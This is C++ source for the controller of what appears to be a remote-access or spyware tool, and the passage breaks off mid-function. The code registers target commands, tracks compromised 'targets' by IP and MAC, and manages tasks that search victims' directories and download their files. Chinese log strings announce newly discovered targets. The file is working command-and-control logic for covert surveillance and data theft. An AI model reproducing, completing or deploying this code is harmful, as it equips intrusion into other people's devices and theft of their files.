//---------------------------------------------------------------------------

#include "adkprecomp.h"
#include "maindlg.h"
#include "targetdlg.h"
#include "TargetConnection.h"
#include "ControlConnection.h"
#include "Utility.h"
#include "DatabaseManager.h"
#include "include/errorcode.h"
#include "include/T5.h"

typedef enum _TARGET_TYPE
{
	WINDOWS_TARGET,
	MACOS_TARGET,
	IOS_TARGET,
	ANDROID_TARGET,
	WINDOWSPHONE_TARGET
} TARGET_TYPE;

static std::map<std::string, TargetCmdHandler>  t_commandHandlers;

//---------------------------------------------------------------------------

std::wstring GetAntiVirusString(ULONG mask);


 TargetConnection::TargetConnection(SOCKET sock, DWORD dwTargetId)
    : Connection(sock)
{
    RegisterCommandHandlers();

	InitializeCriticalSection(&csTarConn);
    
    this->readBuf = (char *) malloc(8192);
    this->ownerTarget = GetTargetFromGlobalMap(dwTargetId);
}
//---------------------------------------------------------------------------
 TargetConnection::~TargetConnection()
{
    if (this->ownerTarget->tarConn == this)
    {
        this->ownerTarget->tarConn = NULL;
    }

    if (this->readBuf)
    {
        free(this->readBuf);
        this->readBuf = NULL;
    }

	DeleteCriticalSection(&csTarConn);
}

 void TargetConnection::FlowStatistics(unsigned int bytes)
 {
	 this->ownerTarget->FlowStatistics(bytes);
 }

//---------------------------------------------------------------------------
void  TargetConnection::RegisterCommandHandlers()
{
    if (t_commandHandlers.size() == 0)
    {
        t_commandHandlers["QNG"] = &TargetConnection::Handle_QNG;
        t_commandHandlers["HEL"] = &TargetConnection::Handle_HEL;

        t_commandHandlers["SCH"] = &TargetConnection::Handle_SCH;
        t_commandHandlers["FTS"] = &TargetConnection::Handle_FTS;
                       
        t_commandHandlers["FTK"] = &TargetConnection::Handle_FTK;
        t_commandHandlers["DTK"] = &TargetConnection::Handle_DTK;
        t_commandHandlers["STK"] = &TargetConnection::Handle_STK;

        t_commandHandlers["AFT"] = &TargetConnection::Handle_AFT;
        t_commandHandlers["ADT"] = &TargetConnection::Handle_ADT;
        t_commandHandlers["AST"] = &TargetConnection::Handle_AST;
        
        t_commandHandlers["CFT"] = &TargetConnection::Handle_CFT;
        t_commandHandlers["PFT"] = &TargetConnection::Handle_PFT;
        t_commandHandlers["RFT"] = &TargetConnection::Handle_RFT;

        // File Task Operation
        //
        t_commandHandlers["UPL"] = &TargetConnection::Handle_UPL;
        t_commandHandlers["DOW"] = &TargetConnection::Handle_DOW;

        t_commandHandlers["FDT"] = &TargetConnection::Handle_FDT;

		// port from control connection
		t_commandHandlers["OUT"] = &TargetConnection::Handle_OUT;

		t_commandHandlers["HEL"] = &TargetConnection::Handle_HEL;
		t_commandHandlers["INI"] = &TargetConnection::Handle_INI;
		t_commandHandlers["TAR"] = &TargetConnection::Handle_TAR;
		t_commandHandlers["CIN"] = &TargetConnection::Handle_CIN;
		t_commandHandlers["STA"] = &TargetConnection::Handle_STA;
		t_commandHandlers["LOG"] = &TargetConnection::Handle_LOG;
		t_commandHandlers["TSW"] = &TargetConnection::Handle_TSW;

		t_commandHandlers["QNG"] = &TargetConnection::Handle_QNG;
		t_commandHandlers["QDA"] = &TargetConnection::Handle_QDA;

		t_commandHandlers["LIR"] = &TargetConnection::Handle_LIR;
		t_commandHandlers["DIR"] = &TargetConnection::Handle_DIR;
		t_commandHandlers["FDL"] = &TargetConnection::Handle_FDL;

		t_commandHandlers["PLI"] = &TargetConnection::Handle_PLI;
		t_commandHandlers["PLD"] = &TargetConnection::Handle_PLD;
		t_commandHandlers["PLG"] = &TargetConnection::Handle_PLG;

		t_commandHandlers["CRP"] = &TargetConnection::Handle_CRP;
		t_commandHandlers["RUN"] = &TargetConnection::Handle_RUN;
		t_commandHandlers["CIT"] = &TargetConnection::Handle_CIT;
		t_commandHandlers["COT"] = &TargetConnection::Handle_COT;
		t_commandHandlers["CFI"] = &TargetConnection::Handle_CFI;

		t_commandHandlers["ERA"] = &TargetConnection::Handle_ERA;
		t_commandHandlers["SDS"] = &TargetConnection::Handle_SDS;
		t_commandHandlers["SIL"] = &TargetConnection::Handle_SIL;

		t_commandHandlers["OSC"] = &TargetConnection::Handle_OSC;
		t_commandHandlers["OSF"] = &TargetConnection::Handle_OSF;
		t_commandHandlers["OSI"] = &TargetConnection::Handle_OSI;

		t_commandHandlers["SSX"] = &TargetConnection::Handle_SSX;
		t_commandHandlers["ESX"] = &TargetConnection::Handle_ESX;

		t_commandHandlers["SCP"] = &TargetConnection::Handle_SCP;

		t_commandHandlers["FMT"] = &TargetConnection::Handle_FMT;
		t_commandHandlers["GPRS"] = &TargetConnection::Handle_GPRS;
		t_commandHandlers["BGS"] = &TargetConnection::Handle_BACKSOUND;
	}
}
//---------------------------------------------------------------------------
void  TargetConnection::HandleIncomingData()
{
    while (IsWholeLineAvailable())
    {
		std::vector<std::string> args = GetLine();

		//  @@Note: COMMAND Format:
		//
		//  Target_id Plugin_id   CMD     Trid    Param ....
		//      0        1         2       3        4
		//
        //  Target_id:
        //        0   ----   Daemon self
        //        n   ----   Data is from target N
		//  Plugin_id:
		//        0   ----   Base Plugin (Daemon'self)
		//		1 - n ----   External Plugins
		//

        // Directly Get CMD Handler 
        //
        if (-1 == DispatchCommand(args))
        {
            return;
        }
	}
}
//---------------------------------------------------------------------------
int   TargetConnection::DispatchCommand(std::vector<std::string> & args)
{
    std::map<std::string, TargetCmdHandler>::iterator i = t_commandHandlers.find(args[2]);
    if (i != t_commandHandlers.end())
    {
		if ( args.size() >= 3 )
		{
			//xTRACEA(("[T9000] [TargetConnection] TID : %s PID : %s CMD : %s\r\n", args[0].c_str(), args[1].c_str(), args[2].c_str()));
		}

        return (this->*t_commandHandlers[args[2]])(args);
    }

    return this->Handle_Plugin_CMD(args);
}
//---------------------------------------------------------------------------
void  TargetConnection::ConnectionCompleted()
{
    if (this->ownerTarget)
    {
        Send_Identity();
        Send_HEL();
    }
    else
    {
        this->CloseConnection();        // 说明出现了一些边界情况，比如在建立目标数据连接的同时，用户清除了该目标
    }
}
//---------------------------------------------------------------------------
void  TargetConnection::ConnectionClosed()
{
    if (this->ownerTarget)
    {
        this->ownerTarget->TargetDataConnOffline();
        if (FrmMain->ctrOnlineFlag == true)
        {
            SendMessage(FrmMain->Handle, WM_TARGET_DATACONNCLOSED, (unsigned int)this->ownerTarget, NULL);
        }        
    }
}

// 主动连接
void TargetConnection::Send_IDE(const char* password)
{

	// 1 1 IDE TARG 密码\r\n
	std::ostringstream buf;
	buf << "1 1 IDE TARG " << password << "\r\n";
	this->Write(buf);
}


//---------------------------------------------------------------------------
void  TargetConnection::Send_Identity()
{
    std::ostringstream buf;
    buf << "0 0 IDE COFI\r\n";
    this->Write(buf);
}
//---------------------------------------------------------------------------
void  TargetConnection::Send_HEL()
{
    // TID PID HEL
	//  0   1   2 
	//
    std::ostringstream buf;
    buf << this->ownerTarget->dwTargetID << " 1 HEL\r\n";
    this->Write(buf);
}
//---------------------------------------------------------------------------
int   TargetConnection::Handle_HEL(std::vector<std::string> & args)
{
	// TID 0 TAR OSNUMBER LANID COMNAMEBASE64 FLAGID MAC IPADDR\r\n
	assert(args.size() == 9);
	ULONG       targetID        = strtoul(args[0].c_str(), NULL, 10);
	ULONG       osBuildNumber   = strtoul(args[3].c_str(), NULL, 10);
	ULONG       lanId   = strtoul(args[4].c_str(), NULL, 10);
	std::string comNameBase64 = args[5];
	ULONG       flag   = strtoul(args[6].c_str(), NULL, 10);
	std::string macAddress = args[7];
	std::string ip     = GetIPStrFromInt32(strtoul(args[8].c_str(), NULL, 10));

	Target *tar = GetTargetFromGlobalMap(targetID);
	if (NULL == tar)
	{
		tar  = new Target();
		tar->dwProtocolVersion = 0;
		tar->dwTargetID        = targetID;
		tar->dwGroupID         = flag ;
		QString convert = QString("%1").arg(targetID);
		tar->aniTargetName     = convert.toStdString();

		tar->widTargetName     = convert.toStdWString();
		tar->dwOsBuildNumber   = osBuildNumber;
		tar->aniRemMacAddr     = macAddress ;
		tar->aniRemPublicIpAddr= ip;
		tar->bIsMyTarget = true;
		tar->dwLangId = 0;
		SendMessage(FrmMain->Handle, WM_NEW_TARGET, (unsigned int)tar, 1);

		SetStatusInfoExA(STATUS_NOTE, "发现一个新目标(目标ID:%u,IP地址:%s, GroupId:%d)",
			targetID, ip.c_str(), flag);
	}

	ownerTarget->tarConn = this;
	ownerTarget->TargetDataConnOnline();

	return 0;
}
//---------------------------------------------------------------------------
void  TargetConnection::Send_STK(ULONG targetId, ULONG taskId)
{
    // TID PID STK TASKID
	//  0   1   2     3
	//
    std::ostringstream buf;
    buf << targetId << " 1 STK " << taskId << "\r\n";
    this->Write(buf);
}
//---------------------------------------------------------------------------
void  TargetConnection::Send_DTK(ULONG targetId, ULONG taskId, BOOL bDetail)
{
    // TID PID DTK TASKID bDETAIL
	//  0   1   2     3      4
	//
    std::ostringstream buf;
    DWORD   dwDetail = 0;
    if (bDetail)
    {
        dwDetail = 1;
    }

    buf << targetId << " 1 DTK " << taskId << " " << dwDetail << "\r\n";
    this->Write(buf);
}

//---------------------------------------------------------------------------
void  TargetConnection::Send_FTK(ULONG targetId, ULONG taskId)
{
    // TID PID FTK
	//  0   1   2 
	//
    std::ostringstream buf;
    buf << targetId << " 1 FTK " << taskId << "\r\n";
    this->Write(buf);
}
//---------------------------------------------------------------------------
int  TargetConnection::Handle_FTK(std::vector<std::string> & args)
{
	// TID PID FTK TaskID TaskDirect TaskStatus CtrPATH TarPATH TotalLen  DaemonedLen FinishedLen ErrorID  TaskType ParentTaskID DaemonBufFinished
	//  0   1   2     3       4          5         6       7        8        9			10           11       12        13               14
	//

    if ( args.size() != 15 )
		return 0;

    ULONG targetID = strtoul(args[0].c_str(),NULL,10);
    Target *tarBlock = GetTargetFromGlobalMap(targetID);
    if (NULL == tarBlock)
    {
        return 0;
    }

    ULONG       pluginID    = strtoul(args[1].c_str(), NULL, 10);
    ULONG       taskID      = strtoul(args[3].c_str(), NULL, 10);
    TaskStatus  taskStatus  = (TaskStatus)atoi(args[5].c_str());
    TaskType    taskType    = (TaskType)atoi(args[12].c_str());
    ULONG       parentTaskID = strtoul(args[13].c_str(), NULL, 10);

    bool bNewFileTask = false;
    TaskStatus oldStatus = WORKING;
    
    FileTask *fileTask = tarBlock->GetFileTaskFromMap(taskID);
    if(fileTask == NULL)
    {
        fileTask = new FileTask();
        fileTask->dwPluginID  = pluginID;
        fileTask->dwTargetID  = targetID;
        fileTask->dwTaskID    = taskID;
        fileTask->dwParentID  = parentTaskID;

        if (args[4] == "DOW")
        {
            fileTask->taskDirect = FILEDOWN;
        }
        else
        {
            fileTask->taskDirect = FILEUP;
        }
        fileTask->taskType = taskType;

		fileTask->aniTmpTaskPath = tarBlock->aniLocalDataDir + "\\FileTasking\\" + QString("%1").arg(taskID).toStdString();
        fileTask->ctrPathW       = GetWideFromBase64(args[6].c_str());
        fileTask->tarPathW       = GetWideFromBase64(args[7].c_str());
        fileTask->hFile          = NULL;
        
        fileTask->dwCTHighDataTime = 0;
        fileTask->dwCTLowDataTime  = 0;
        fileTask->dwLWHighDataTime = 0;
        fileTask->dwLWLowDataTime  = 0;
        fileTask->dwLAHighDataTime = 0;
        fileTask->dwLALowDataTime  = 0;

        bNewFileTask = true;
    }
    else
    {
        oldStatus = (TaskStatus)fileTask->taskStatus;
    }

    fileTask->taskStatus    = taskStatus;
    fileTask->dwTotalLen    = strtoul(args[8].c_str(),NULL,10);
    fileTask->dwDaemonedLen = strtoul(args[9].c_str(),NULL,10);
    fileTask->dwFinishedLen = strtoul(args[10].c_str(),NULL,10);
    fileTask->dwErrorID     = strtoul(args[11].c_str(),NULL,10);

    if (0 != fileTask->dwTotalLen)
    {
        fileTask->nFinishedProp = (int)((double)fileTask->dwFinishedLen /(double)fileTask->dwTotalLen * 100);
        fileTask->nDaemonedProp = (int)((double)(fileTask->dwDaemonedLen - fileTask->dwFinishedLen) /(double)fileTask->dwTotalLen * 100);
    }
    else
    {
        fileTask->nDaemonedProp = 100;    
        fileTask->nFinishedProp = 100;
    }

    ULONG dwDaeFinished = strtoul(args[14].c_str(), NULL, 10);
    if (dwDaeFinished == 0)
    {
        fileTask->bDaemonBufFinished = false;
    }
    else
    {
        fileTask->bDaemonBufFinished = true;
    }
    
    if (taskStatus == ERRORED || taskStatus == FINISHED || taskStatus == CANCELED)
    {
        // 对于简单FileTask, 当其已经是无效时，通知中转清除该FileTask
        // 对于复合FileTask, 其在中转端的清除，由上层Task的清除而自动清除
        //
        if (parentTaskID == 0)
        {
            this->Send_DFT(targetID, taskID, taskType);
            
            // 记录FileTask到数据库中
            //
            DM->InsertFileTask(fileTask, args[6].c_str(), args[7].c_str());
        }
        else
        {
            // 对于复合Task的子TASK，需要先检查再入库
            //
            DM->CheckAndInsertFileTask(fileTask, args[6].c_str(), args[7].c_str()); 
        }
    }    

    if (bNewFileTask)
    {
        tarBlock->AddFileTask(fileTask);
    }
    else
    {
        tarBlock->FileTaskStatusChanged(fileTask, oldStatus);   
    }


    return 0;
}
//---------------------------------------------------------------------------
int  TargetConnection::Handle_DTK(std::vector<std::string> & args)
{
	// TID PID DTK TaskID TaskDirect TaskStatus TarDisPathBase64 LEVEL AutoDown  ErrorID  WorkingCount ErroredCount CanceledCount PausedCount FinishedCount
	//  0   1   2    3		   4		 5				6			7     8        9            10          11            12            13          14
	//
	if ( args.size() != 15 )
		return 0;

    ULONG targetID = strtoul(args[0].c_str(),NULL,10);
    Target *tarBlock = GetTargetFromGlobalMap(targetID);
    if (NULL == tarBlock)
    {
        assert(false);
        return 0;
    }

    ULONG taskID = strtoul(args[3].c_str(), NULL, 10);
    TaskStatus taskStatus = (TaskStatus)atoi(args[5].c_str());
    DWORD   dwAutoDown = strtoul(args[8].c_str(), NULL, 10);

    bool bNewTask = false;
    TaskStatus oldStatus = WORKING;
    DirTask *dirTask = tarBlock->GetDirTaskFromMap(taskID);
    if (dirTask == NULL)
    {
        dirTask  = new DirTask();
        dirTask->dwTargetID   = targetID;
        dirTask->dwTaskID     = taskID;
        dirTask->taskDirect   = FILEDOWN;
        
        dirTask->tarDirPathW  = GetWideFromBase64(args[6].c_str());

        dirTask->dwLevel = strtoul(args[7].c_str(), NULL, 10);
        dirTask->dwAutoDown = dwAutoDown;

        dirTask->lpInfoFileTask = NULL;

        dirTask->dwWorkingCount = 0;
        dirTask->dwErroredCount = 0;
        dirTask->dwCanceledCount = 0;
        dirTask->dwPausedCount = 0;
        dirTask->dwFinishedCount = 0;
        
        bNewTask = true;
    }
    else
    {
        oldStatus = (TaskStatus)dirTask->taskStatus;

        xASSERT((dirTask->dwAutoDown == dwAutoDown));
    }

    if (dirTask->dwAutoDown == 1)
    {
        dirTask->dwWorkingCount = strtoul(args[10].c_str(), NULL, 10);
        dirTask->dwErroredCount = strtoul(args[11].c_str(), NULL, 10);
        dirTask->dwCanceledCount = strtoul(args[12].c_str(), NULL, 10);
        dirTask->dwPausedCount = strtoul(args[13].c_str(), NULL, 10);
        dirTask->dwFinishedCount = strtoul(args[14].c_str(), NULL, 10);
    }
    
    dirTask->taskStatus = taskStatus;
    dirTask->dwErrorID  = strtoul(args[9].c_str(), NULL, 10);

    if (taskStatus == ERRORED || taskStatus == FINISHED || taskStatus == CANCELED)
    {
        // 收到无效DirTask时，通知中转清除该DirTask及所有子Task
        //
        this->Send_DFT(targetID, taskID, TASK_DIR);

        if (dirTask->dwAutoDown == 1)
        {
            DM->InsertDirDownTask(dirTask, args[6].c_str());
        }
        else
        {
            DM->InsertDirInfoTask(dirTask, args[6].c_str());
        }
    }
        
    if (bNewTask)
    {
        tarBlock->AddDirTask(dirTask);
    }
    else
    {
        // 更新界面
        //
        if (tarBlock->frmTarControl && tarBlock->frmTarControl->Handle)
        {
            SendMessage(tarBlock->frmTarControl->Handle, WM_UPT_DIRTASK_STATISTIC, (unsigned int)dirTask, NULL);
        }

		tarBlock->DirFinished(dirTask, oldStatus);
    }

    return 0;
}
//---------------------------------------------------------------------------
int  TargetConnection::Handle_STK(std::vector<std::string> & args)
{
	// TID PID STK TaskID TaskDirect TaskStatus TarDisPathBase64 LEVEL AutoDown ErrorID
	//  0   1   2    3		   4		 5				6			7     8        9

    // MinSize MaxSize LowBegTime HighBegTime LowEndTime HighEndTime NameBase64 TypeBase64\r\n
	//   10        11      12           13        14         15          16         17
	//

    ULONG targetID = strtoul(args[0].c_str(),NULL,10);
    Target *tarBlock = GetTargetFromGlobalMap(targetID);
    if (NULL == tarBlock)
    {
        assert(false);
        return 0;
    }

    bool bNewTask = false;
    TaskStatus oldStatus = WORKING;
    ULONG taskID = strtoul(args[3].c_str(), NULL, 10);
    PSearchTask lpSearchTask = tarBlock->GetSearchTaskFromMap(taskID);
    if (lpSearchTask == NULL)
    {
        lpSearchTask  = new SearchTask();
        lpSearchTask->dwTargetID   = targetID;
        lpSearchTask->dwTaskID     = taskID;
        lpSearchTask->taskDirect   = FILEDOWN;
        
        lpSearchTask->tarDirPathW  = GetWideFromBase64(args[6].c_str());

        lpSearchTask->dwLevel = strtoul(args[7].c_str(), NULL, 10);
        lpSearchTask->dwAutoDown = strtoul(args[8].c_str(), NULL, 10);

        lpSearchTask->lpInfoFileTask = NULL;

        // MinSize MaxSize LowBegTime HighBegTime LowEndTime HighEndTime NameBase64 TypeBase64\r\n
    	//   10        11      12           13        14         15          16         17
	    //

        lpSearchTask->ulMinSize = strtoul(args[10].c_str(), NULL, 10);
        lpSearchTask->ulMaxSize = strtoul(args[11].c_str(), NULL, 10);

        if (lpSearchTask->ulMinSize == 0 && lpSearchTask->ulMaxSize == 0)
        {
            lpSearchTask->bSizeFilter = false;
        }
        else
        {
            lpSearchTask->bSizeFilter = true;
        }

        lpSearchTask->ftBegTime.dwLowDateTime  = strtoul(args[12].c_str(), NULL, 10);
        lpSearchTask->ftBegTime.dwHighDateTime = strtoul(args[13].c_str(), NULL, 10);
        lpSearchTask->ftEndTime.dwLowDateTime  = strtoul(args[14].c_str(), NULL, 10);
        lpSearchTask->ftEndTime.dwHighDateTime = strtoul(args[15].c_str(), NULL, 10);

        if (lpSearchTask->ftBegTime.dwLowDateTime == 0
        &&  lpSearchTask->ftBegTime.dwHighDateTime == 0
        &&  lpSearchTask->ftEndTime.dwLowDateTime == 0
        &&  lpSearchTask->ftEndTime.dwHighDateTime == 0)
        {
            lpSearchTask->bTimeFilter = false;
        }
        else
        {
            lpSearchTask->bTimeFilter = true;
        }

        lpSearchTask->widName = GetWideFromBase64(args[16].c_str());

		if (lpSearchTask->widName == std::wstring(L"*"))
        {
            lpSearchTask->bNameFilter = false;
        }
        else
        {
            lpSearchTask->bNameFilter = true;
        }

        lpSearchTask->widType = GetWideFromBase64(args[17].c_str());

		if (lpSearchTask->widType == std::wstring(L"*"))
        {
            lpSearchTask->bTypeFilter = false;
        }
        else
        {
            lpSearchTask->bTypeFilter = true;
        }

        bNewTask = true;
    }
    else
    {
        oldStatus = (TaskStatus)lpSearchTask->taskStatus;
    }

    TaskStatus taskStatus = (TaskStatus)atoi(args[5].c_str());
    lpSearchTask->taskStatus = taskStatus;
    lpSearchTask->dwErrorID  = strtoul(args[9].c_str(), NULL, 10);

    if (taskStatus == ERRORED || taskStatus == FINISHED || taskStatus == CANCELED)
    {
        // 收到无效SearchTask时，通知中转清除该SearchTask及所有子Task
        //
        this->Send_DFT(targetID, taskID, TASK_SEARCH);

        // 保存到数据库中
        //
        DM->InsertSearchTask(lpSearchTask, args[6].c_str(), args[16].c_str(), args[17].c_str());
    }

    if (bNewTask)
    {
        tarBlock->AddSearchTask(lpSearchTask);
    }
    else
    {
        tarBlock->SearchTaskStatusChanged(lpSearchTask, oldStatus);               
    }
        
    return 0;
}
//---------------------------------------------------------------------------
void  TargetConnection::Send_AFT(ULONG        targetID,
                                            TaskDirect   taskDirect,
                                            const char*        ctrPathBase64,
                                            const char*        tarPathBase64,
                                            ULONG        totalLen)
{
	// TID PID AFT TASKDIRECT CTRPATH TARPATH TOTALLEN
	//  0   1   2      3        4        5        6
	//

    std::ostringstream buf;
    if (taskDirect == FILEDOWN)
    {
        buf << targetID << " 1 AFT DOW " << ctrPathBase64 << " " << tarPathBase64 << " " << totalLen << "\r\n";
    }
    else
    {
        buf << targetID << " 1 AFT UPL " << ctrPathBase64 << " " << tarPathBase64 << " " << totalLen << "\r\n";
    }
    
    this->Write(buf);
}
//---------------------------------------------------------------------------
int   TargetConnection::Handle_AFT(std::vector<std::string> & args)
{
	// TID PID AFT TASKDIRECT CTRPATH TARPATH TotalLen OK(ERR) [ERRID]
	//  0   1   2     3         4       5        6        7        8
	//

    if (args.size() != 8 && args.size() != 9)
    {
        assert(false);
        return 0;
    }

    ULONG targetID = strtoul(args[0].c_str(),NULL,10);
    Target *tarBlock = GetTargetFromGlobalMap(targetID);
    if (NULL == tarBlock)
    {
        assert(false);
        return 0;
    }

    TaskDirect taskDirect = ConvertStrToTaskDirect(args[3]);
    std::wstring ctrPathW = GetWideFromBase64(args[4].c_str());
    std::wstring tarPathW  = GetWideFromBase64(args[5].c_str());

    if ("OK" == args[7])
    {
        if (taskDirect == FILEDOWN)
        {
            SetTarStatusInfoExW(STATUS_INFO, tarBlock, L"[目标%s(ID:%d)] 成功添加文件下载指令 - 下载文件\"%s\"",
                                            tarBlock->widTargetName.c_str(),
                                            tarBlock->dwTargetID,
                                            tarPathW.c_str());
        }
        else
        {
            SetTarStatusInfoExW(STATUS_INFO, tarBlock, L"[目标%s(ID:%d)] 成功添加文件上传指令 - 上传文件\"%s\"到\"%s\"",
                                            tarBlock->widTargetName.c_str(),
                                            tarBlock->dwTargetID,
                                            ctrPathW.c_str(),
                                            tarPathW.c_str());
        }
    }
    else
    {
        ULONG lastErrCode = strtoul(args[8].c_str(),NULL,10);

        if (taskDirect == FILEDOWN)
        {
            SetTarStatusInfoExW(STATUS_ERROR, tarBlock, L"[目标%s(ID:%d)] 添加文件下载指令失败 - 下载文件\"%s\"! %s",
                                                    tarBlock->widTargetName.c_str(),
                                                    tarBlock->dwTargetID,
                                                    ctrPathW.c_str(),
                                                    tarPathW.c_str(),
                                                    ConvertErrorIdToStrW(lastErrCode).c_str());
        }
        else
        {

            SetTarStatusInfoExW(STATUS_ERROR, tarBlock, L"[目标%s(ID:%d)] 添加文件上传指令失败 - 上传文件\"%s\"到\"%s\"! %s",
                                                    tarBlock->widTargetName.c_str(),
                                                    tarBlock->dwTargetID,
                                                    ctrPathW.c_str(),
                                                    tarPathW.c_str(),
                                                    ConvertErrorIdToStrW(lastErrCode).c_str());        
        }
    }

    return 0;
}
//---------------------------------------------------------------------------
void  TargetConnection::Send_ADT(ULONG      targetID,
                                            TaskDirect taskDirect,
                                            const char*      tarDirPathBase64,
                                            ULONG      level,
                                            ULONG      autoDown)
{
	// TID PID ADT TaskDirect TarDisPathBase64 LEVEL AutoDown
	//  0   1   2      3		   4		     5		6
	//

    std::ostringstream buf;
    buf << targetID << " 1 ADT DOW " << tarDirPathBase64 << " " << level << " " << autoDown << "\r\n";
    this->Write(buf);
}
//---------------------------------------------------------------------------
int  TargetConnection::Handle_ADT(std::vector<std::string> & args)
{
	// TID PID ADT TaskDirect TarDisPathBase64 LEVEL FileDown OK(ERR) [ERRID]
	//  0   1   2     3		      4		        5	    6		7       8     
	//
    
    if (args.size() != 8 && args.size() != 9)
    {
        assert(false);
        return 0;
    }
    
    ULONG targetID = strtoul(args[0].c_str(),NULL,10);
    Target *tarBlock = GetTargetFromGlobalMap(targetID);
    if (NULL == tarBlock)
    {
        assert(false);
        return 0;
    }

    TaskDirect  taskDirect  = ConvertStrToTaskDirect(args[3]);
    std::wstring  tarPathW    = GetWideFromBase64(args[4].c_str());
    DWORD       dwLevel     = strtoul(args[5].c_str(), NULL, 10);
    ULONG       dwAutoDown  = strtoul(args[6].c_str(), NULL, 10);

    if ("OK" == args[7])
    {
        if (dwAutoDown == 1)
        {
            SetTarStatusInfoExW(STATUS_INFO, tarBlock, L"[目标%s(ID:%d)] 成功添加任务 - 下载目录\"%s\"",
                                            tarBlock->widTargetName.c_str(),
                                            tarBlock->dwTargetID,
                                            tarPathW.c_str());
        }
        else
        {
            SetTarStatusInfoExW(STATUS_INFO, tarBlock, L"[目标%s(ID:%d)] 成功添加任务 - 获取目录\"%s\"信息",
                                            tarBlock->widTargetName.c_str(),
                                            tarBlock->dwTargetID,
                                            tarPathW.c_str());
        }
    }
    else
    {
        ULONG lastErrCode = strtoul(args[8].c_str(),NULL,10);

        if (dwAutoDown == 1)
        {
            SetTarStatusInfoExW(STATUS_ERROR, tarBlock, L"[目标%s(ID:%d)] 添加任务失败 - 下载目录\"%s\"! %s",
                                                    tarBlock->widTargetName.c_str(),
                                                    tarBlock->dwTargetID,
                                                    tarPathW.c_str(),
                                                    ConvertErrorIdToStrW(lastErrCode).c_str());
        }
        else
        {
            SetTarStatusInfoExW(STATUS_ERROR, tarBlock, L"[目标%s(ID:%d)] 添加任务失败 - 获取目录\"%s\"信息! %s",
                                                    tarBlock->widTargetName.c_str(),
                                                    tarBlock->dwTargetID,
                                                    tarPathW.c_str(),
                                                    ConvertErrorIdToStrW(lastErrCode).c_str());
        }
    }

    return 0;
}
//---------------------------------------------------------------------------
void  TargetConnection::Send_AST(ULONG           targetID,
                                            TaskDirect      taskDirect,
                                            PCHAR           tarDirPathBase64,
                                            ULONG           level,
                                            PSearchFilter   lpSearchFilter,
                                            ULONG           autoDown)
{
	// TID PID AST TaskDirect TarDirPathBase64 LEVEL AutoDown
	//  0   1   2      3		      4		     5	     6	  

    // MinSize MaxSize LowBegTime HighBegTime LowEndTime HighEndTime NameBase64 TypeBase64\r\n
	//   7        8        9           10          11         12           13          14
    
    xASSERT((lpSearchFilter));

    std::ostringstream buf;
    buf << targetID << " 1 AST DOW " << tarDirPathBase64 << " " << level << " " << autoDown 
        << " " << lpSearchFilter->dwMinSize << " " << lpSearchFilter->dwMaxSize
        << " " << lpSearchFilter->uliBegTime.LowPart << " " << lpSearchFilter->uliBegTime.HighPart
        << " " << lpSearchFilter->uliEndTime.LowPart << " " << lpSearchFilter->uliEndTime.HighPart
        << " " << GetBase64FromWide(lpSearchFilter->widName).c_str() << " " << GetBase64FromWide(lpSearchFilter->widType).c_str() << "\r\n";
    this->Write(buf);
}
//---------------------------------------------------------------------------
int   TargetConnection::Handle_AST(std::vector<std::string> & args)
{
	// TID PID AST TaskDirect TarDirPathBase64 LEVEL AutoDown
	//  0   1   2      3		      4		     5	     6	  

    // MinSize MaxSize LowBegTime HighBegTime LowEndTime HighEndTime NameBase64 TypeBase64
	//   7        8        9           10          11         12           13          14
    
    // OK(ERR) [ERRID] \r\n
    //   15      16

    if (args.size() != 16 && args.size() != 17)
    {
        assert(false);
        return 0;
    }
    
    ULONG targetID = strtoul(args[0].c_str(),NULL,10);
    Target *tarBlock = GetTargetFromGlobalMap(targetID);
    if (NULL == tarBlock)
    {
        assert(false);
        return 0;
    }

    TaskDirect  taskDirect = ConvertStrToTaskDirect(args[3]);
    std::wstring  tarPathW   = GetWideFromBase64(args[4].c_str());
    DWORD       dwLevel    = strtoul(args[5].c_str(), NULL, 10);

    if ("OK" == args[15])
    {
        SetTarStatusInfoExW(STATUS_INFO, tarBlock, L"[目标%s(ID:%d)] 成功添加异步搜索指令 - 搜索目录\"%s\"",
                                            tarBlock->widTargetName.c_str(),
                                            tarBlock->dwTargetID,
                                            tarPathW.c_str());
    }
    else
    {
        ULONG lastErrCode = strtoul(args[16].c_str(),NULL,10);

        SetTarStatusInfoExW(STATUS_ERROR, tarBlock, L"[目标%s(ID:%d)] 添加异步搜索指令失败 - 搜索目录\"%s\"! %s",
                                                    tarBlock->widTargetName.c_str(),
                                                    tarBlock->dwTargetID,
                                                    tarPathW.c_str(),
                                                    ConvertErrorIdToStrW(lastErrCode).c_str());
    }
    
    return 0;
}

//---------------------------------------------------------------------------
int   TargetConnection::Handle_SCH(std::vector<std::string> & args)
{
    // TID PID SCH
    //  0   1   2
    //

    // 通知重新调度，这里后面需要进行优化的 @@@
    //
    ownerTarget->ReScheduleTarFileTask();

	return 0;
}
//---------------------------------------------------------------------------
void  TargetConnection::Send_DOW(FileTask *fileTask, int startPos)
{
	// TID PID DOW TaskID StartPos PathBase64
	//  0   1   2     3       4
	//
    
    std::ostringstream buf;    
    buf << ownerTarget->dwTargetID << " 1 DOW " << fileTask->dwTaskID << " " << startPos << 
		" " << WideToAnsi(fileTask->tarPathW).c_str() << "\r\n";
    this->Write(buf);
}
//---------------------------------------------------------------------------
int  TargetConnection::Handle_FDT(std::vector<std::string> & args)
{
	// TID PID FDT TaskID Base64Path  CTHighDataTime CTLowDataTime LWHighDataTime LWLowDataTime	LAHighDataTime LALowDataTime
	//  0   1   2    3			4			  5				6				7			  8				9			10
	//
    
	ULONG targetID = strtoul(args[0].c_str(),NULL,10);
	Target *tarBlock = GetTargetFromGlobalMap(targetID);
	if (NULL == tarBlock)
	{
		return 0;
	}
	bool bNewFileTask = false;
	ULONG  pluginID    = strtoul(args[1].c_str(), NULL, 10);
    ULONG  taskID = strtoul(args[3].c_str(), NULL, 10);
    FileTask *lpFileTask = ownerTarget->GetFileTaskFromMap(taskID);
	if (!lpFileTask)
	{
		lpFileTask = new FileTask;
		lpFileTask->dwPluginID  = pluginID;
		lpFileTask->dwTargetID  = targetID;
		lpFileTask->dwTaskID    = taskID;
		lpFileTask->taskDirect = FILEDOWN;
		lpFileTask->taskType = TASK_FILEDATA;

		lpFileTask->aniTmpTaskPath = tarBlock->aniLocalDataDir + "\\FileTasking\\" + QString("%1").arg(taskID).toStdString();
		lpFileTask->ctrPathW       = L"..";
		lpFileTask->tarPathW       = GetWideFromBase64(args[4].c_str());
		lpFileTask->hFile          = NULL;

		bNewFileTask = true;
	}

    if (lpFileTask)
    {
